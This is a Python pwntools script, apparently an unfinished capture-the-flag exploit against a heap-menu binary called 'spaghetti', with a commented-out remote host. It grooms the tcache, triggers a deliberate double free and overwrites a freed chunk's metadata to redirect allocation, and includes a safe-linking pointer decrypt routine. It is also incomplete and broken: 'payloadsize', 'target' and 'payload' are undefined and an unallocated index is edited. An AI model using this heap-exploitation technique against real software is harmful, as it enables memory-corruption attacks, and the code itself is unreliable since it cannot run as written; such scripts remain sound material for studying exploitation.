from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./spaghetti"
#p=process(binaryname)
#p=remote("207.154.239.148", 1369)
p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def getleak(resp):
    rleak = resp.split(b"index?\n> ")[1].split(b"\nYou")[0]
    return u64(rleak.ljust(8, b"\x00"))


for i in range (7):
    malloc(i,0x108)

malloc(7, 0x108)
malloc(8, 0x108)
malloc(69, 0x18)
#john is abocve
free(0)
free(1)
free(2)
free(3)
free(4)
free(5)
free(6)


#T->6->5->4->3->2->1->0->null
free(8)
free(7)

malloc(10,0x108)
#5-4-3-2-1-0

free(8) #double free
malloc(99, 0x138)
#99 has our leak. Since we are not on glib c 3.1, this is encrrypted
edit(99,b"A"*payloadsize + p64(0x111) + p64(target))


malloc(100, 0x108)
malloc(101, 0x108)
edit(102,payload)
